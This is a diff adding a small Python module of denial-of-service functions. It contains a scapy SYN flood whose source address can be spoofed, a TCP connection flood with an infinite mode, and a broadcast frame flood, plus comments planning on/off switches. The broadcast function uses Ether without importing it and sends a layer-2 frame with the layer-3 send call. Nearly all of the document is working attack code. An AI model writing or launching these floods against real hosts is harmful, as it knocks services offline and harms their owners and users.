@@ -1,0 +1,52 @@
+import socket
+import time
+from scapy.all import IP, TCP, send
+
+def synFlood(src, dst, sport, dport, frames, selectedInterface):
+    print("!!DoS is starting!!")
+    print(src, dst, sport, dport, frames, selectedInterface)
+
+    for x in range(frames):
+        seq = 1234 + x
+        ip = IP(src=src, dst=dst)
+        SYN = TCP(sport=sport, dport=dport, flags="S", seq=seq)
+        send(ip/SYN, iface=selectedInterface)  # send is for layer 3 and handles routing, sendp is for layer 2
+
+def ipConnection(ip, port):
+  try:
+    # Create a socket
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+      # Connect to server
+      sock.connect((ip, port))
+      print(f"Connected to {ip}:{port}")
+      return True
+    
+  except socket.error as e:
+    print(f"Connection failed: {e}")
+    return False
+
+def ipConnectionFlood(ip, port, connections, delay):
+  if connections == 0:
+    print("Infinite connection attempts.")
+    while True:
+      ipConnection(ip, port)
+      time.sleep(delay)
+
+  else:
+    for connection in range(connections):
+      print(f"Attempt {connection + 1} of {connections}")
+      if ipConnection(ip, port):
+        break
+      time.sleep(delay)
+
+
+def broadcastFlood(frames, selectedInterface):
+  for x in range(frames):
+    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
+    send(eth, iface=selectedInterface)
+
+
+
+#Most functions should have an infinite otion. This can be figured out later
+#these functions should have an on off switch.
+#probably have to be async or something 
